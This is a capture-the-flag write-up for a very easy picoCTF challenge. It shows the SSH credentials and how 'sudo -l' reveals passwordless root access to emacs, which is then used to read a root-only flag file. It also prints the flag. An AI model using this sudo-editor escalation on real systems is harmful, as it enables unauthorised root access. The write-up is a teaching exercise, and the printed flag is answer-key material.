# SUDO MAKE ME A SANDWICH

**Category:** General Skills  
**Difficulty:** Very Easy  
**Author:** DARKRAICG492  

---

## Challenge Description
Can you read the flag? I think you can!

```
ssh -p 57372 ctf-player@green-hill.picoctf.net ( -p mean port depend on every time you generated instance )
```

Password:
```
430838f7
```

---

## Hints
1. What is sudo?
2. How do you know what permission you have?

---

# Write-up

## 1. Initial Access

Connect to the challenge instance using the provided SSH credentials:

```bash
ssh -p 57372 ctf-player@green-hill.picoctf.net ( Look carefully your port to change it correctly )
```

Enter the password when prompted:

```
430838f7 
```

After logging in, you will obtain a shell as the user `ctf-player`.

---

## 2. Reconnaissance

List the files in the directory:

```bash
ls
```

You will see a file named:

```
flag.txt
```

Attempting to read it directly:

```bash
cat flag.txt
```

Result:

```
cat: flag.txt: Permission denied
```

Check the file permissions:

```bash
ls -la
```

Output:

```
-r--r----- 1 root root ... flag.txt
```

Explanation:

- The file is owned by **root**
- Only the owner and group have read permissions
- The current user (`ctf-player`) does **not** have access

Trying to read it with sudo also fails:

```bash
sudo cat flag.txt
```

Output:

```
Sorry, user ctf-player is not allowed to execute '/usr/bin/cat flag.txt' as root.
```

---

## 3. Checking Sudo Permissions

The next step is to check which commands the current user is allowed to execute with `sudo`.

Run:

```bash
sudo -l
```

Output:

```
User ctf-player may run the following commands on challenge:
(ALL) NOPASSWD: /bin/emacs
```

This means:

- The user can run **emacs**
- As **root**
- **Without entering a password**

This is a classic **sudo misconfiguration**.

---

## 4. Privilege Escalation

Since `emacs` can be executed as root, it can be used to open restricted files.

Run:

```bash
sudo emacs flag.txt
```

Because the editor runs with **root privileges**, it can read the file normally.

The contents of `flag.txt` become visible inside the editor.

---

## Flag

```
picoCTF{ju57_5ud0_17_c2c0d2e2}
```

---

## Key Takeaway

This challenge demonstrates a common **sudo misconfiguration**:

- Allowing a user to run powerful programs (like `emacs`) as root
- Without restricting what files they can open

Programs with built-in file editing or shell capabilities can easily be abused for **privilege escalation**.